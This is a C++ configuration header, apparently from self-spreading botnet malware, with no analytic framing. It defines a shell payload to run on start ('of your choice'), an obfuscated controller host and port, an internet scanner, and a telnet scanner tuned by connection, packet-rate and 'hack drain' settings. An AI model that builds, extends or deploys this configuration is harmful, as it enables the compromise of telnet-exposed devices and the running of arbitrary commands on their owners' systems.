// RENAME INTO: env.hpp

#ifndef ENV_HPP
#define ENV_HPP

#include "core/obf/MetaString.h"

// This will insert print statements into the binary.
// Comment-out on production releeases.
#define TALK

// Shell code of your choice to be executed.
// This is optional. Comment-out if you wish not to have shell code executed on start.
#define PAYLOAD O("whoami")

// Internet scanner configuration.
// #define NET_SCANNER_ON
#define NET_SCANNER_TIMEOUT 1

#define DOMENA_HOST O("127.0.0.1")
#define DOMENA_PORT 60798
#define DOMENA_SSL false

// Defines a read limit from the network.
#define ENV_NETWORK_READ_MAX 100240

// Comment-out in order to disable the telnet scanner.
#define TELNET_SCANNER_ON
// Telnet scanner configuration.
#define SCANNER_MAX_CONNS 1
#define SCANNER_RDBUF_SIZE 256
#define SCANNER_RAW_PPS 160
#define SCANNER_HACK_DRAIN 64

#endif // ENV_HPP